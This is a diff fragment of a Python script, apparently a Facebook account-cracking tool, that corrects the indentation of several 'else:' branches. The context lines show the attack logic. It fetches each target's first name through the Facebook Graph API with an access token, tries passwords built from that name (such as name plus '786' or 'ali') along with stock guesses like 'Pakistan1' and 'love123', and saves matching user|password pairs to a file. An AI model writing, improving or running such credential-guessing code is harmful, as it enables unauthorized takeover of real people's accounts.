@@ -421,7 +421,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cp.append(user+pass7)
-																	else:
+														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass8 =  'Pakistan1'
@@ -437,7 +437,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass8+"\n")
 																	cek.close()
 																	cp.append(user+pass8)
-																	else:
+														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass9 =  b  ['first_name'] + '12'
@@ -453,7 +453,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass9+"\n")
 																	cek.close()
 																	cp.append(user+pass9)
-																	else:
+														else: 
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass10 =  b  ['first_name'] + '786'
@@ -469,7 +469,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass10+"\n")
 																	cek.close()
 																	cp.append(user+pass10)
-															else:
+														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass11 =  'love123'
@@ -485,7 +485,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass11+"\n")
 																	cek.close()
 																	cp.append(user+pass11)
-																	else:
+														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass12 =   'Katrina123'
@@ -501,7 +501,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass12+"\n")
 																	cek.close()
 																	cp.append(user+pass12)
-																	else:
+														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass13 =  b  ['first_name'] + 'ali'
